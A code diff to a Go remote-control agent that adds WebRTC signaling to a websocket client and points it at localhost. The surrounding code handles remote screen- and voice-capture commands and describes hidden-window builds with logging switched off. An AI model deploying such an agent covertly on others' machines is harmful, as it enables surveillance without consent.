@@ -24,7 +24,7 @@ import (
 
 // Server URL - can be overridden at build time using:
 // go build -ldflags="-X main.SERVER_URL=wss://dws-parth.daucu.com/ws/client"
-var SERVER_URL = "wss://dws-parth.daucu.com/ws/client"
+var SERVER_URL = "ws://localhost:8080/ws/client"
 
 // Production mode - set to "true" at build time to disable console logging
 // go build -ldflags="-X main.PRODUCTION=true -H windowsgui"
@@ -338,16 +338,22 @@ func (a *Agent) ListenForCommands() {
 				responseType = "screen_capture"
 			case "voice_capture":
 				responseType = "voice_data"
+			case "webrtc_offer", "webrtc_ice", "webrtc_signal":
+				// WebRTC messages - don't send automatic response, handled by handler directly
+				responseType = ""
 			}
 
-			responseMsg := ClientMessage{
-				Type:     responseType,
-				DeviceID: a.deviceID,
-				Data:     response,
+			// Only send response if responseType is set
+			if responseType != "" {
+				responseMsg := ClientMessage{
+					Type:     responseType,
+					DeviceID: a.deviceID,
+					Data:     response,
+				}
+				a.writeMux.Lock()
+				a.conn.WriteJSON(responseMsg)
+				a.writeMux.Unlock()
 			}
-			a.writeMux.Lock()
-			a.conn.WriteJSON(responseMsg)
-			a.writeMux.Unlock()
 		}
 	}
 }
@@ -709,6 +715,92 @@ func (a *Agent) HandleCommand(cmdType string, data interface{}) interface{} {
 	case "voice_capture":
 		response := HandleVoiceControl(dataJSON)
 		return response
+
+	case "webrtc_signal", "webrtc_offer":
+		// Handle WebRTC signal from frontend (frontend uses webrtc_signal with nested type)
+		log.Printf("📡 Received WebRTC signal/offer")
+		var signalData map[string]interface{}
+		json.Unmarshal(dataJSON, &signalData)
+
+		// Check for nested type (frontend sends: data.type = "offer", data.sdp = "...")
+		signalType, _ := signalData["type"].(string)
+
+		// Get SDP from the data
+		sdpStr, ok := signalData["sdp"].(string)
+		if (!ok || sdpStr == "") && signalType == "offer" {
+			// SDP might not be present, that's ok for now
+			log.Printf("⚠️ No SDP in WebRTC signal, signalType=%s", signalType)
+			return nil
+		}
+
+		// Only process offers
+		if signalType != "" && signalType != "offer" {
+			log.Printf("📡 WebRTC signal type: %s (not an offer, skipping)", signalType)
+			return nil
+		}
+
+		if sdpStr == "" {
+			log.Printf("⚠️ No SDP in WebRTC offer")
+			return nil
+		}
+
+		log.Printf("🔧 Processing WebRTC offer, creating session...")
+
+		// Initialize WebRTC with the offer - ICE callback sends candidates to frontend
+		_, answerSDP, err := InitializeWebRTCWithOffer(a.deviceID, sdpStr, func(candidate interface{}) {
+			if candidate == nil {
+				return
+			}
+			iceMsg := ClientMessage{
+				Type:     "webrtc_ice",
+				DeviceID: a.deviceID,
+				Data: map[string]interface{}{
+					"candidate": candidate,
+				},
+			}
+			a.writeMux.Lock()
+			a.conn.WriteJSON(iceMsg)
+			a.writeMux.Unlock()
+			log.Printf("📡 Sent ICE candidate to frontend")
+		})
+
+		if err != nil {
+			log.Printf("❌ WebRTC initialization failed: %v", err)
+			return nil
+		}
+
+		log.Printf("✅ WebRTC answer created, sending to frontend...")
+
+		// Send answer back to frontend
+		answerMsg := ClientMessage{
+			Type:     "webrtc_answer",
+			DeviceID: a.deviceID,
+			Data: map[string]interface{}{
+				"sdp": answerSDP,
+			},
+		}
+		a.writeMux.Lock()
+		a.conn.WriteJSON(answerMsg)
+		a.writeMux.Unlock()
+		log.Printf("📤 Sent WebRTC answer to frontend")
+
+		return nil
+
+	case "webrtc_ice":
+		// Handle ICE candidate from frontend
+		log.Printf("📡 Received ICE candidate from frontend")
+		var iceData map[string]interface{}
+		json.Unmarshal(dataJSON, &iceData)
+
+		session := GetWebRTCSession(a.deviceID)
+		if session != nil {
+			if candidateData, ok := iceData["candidate"]; ok {
+				candidateJSON, _ := json.Marshal(candidateData)
+				session.HandleICECandidate(string(candidateJSON))
+			}
+		}
+
+		return nil
 
 	default:
 		return map[string]interface{}{
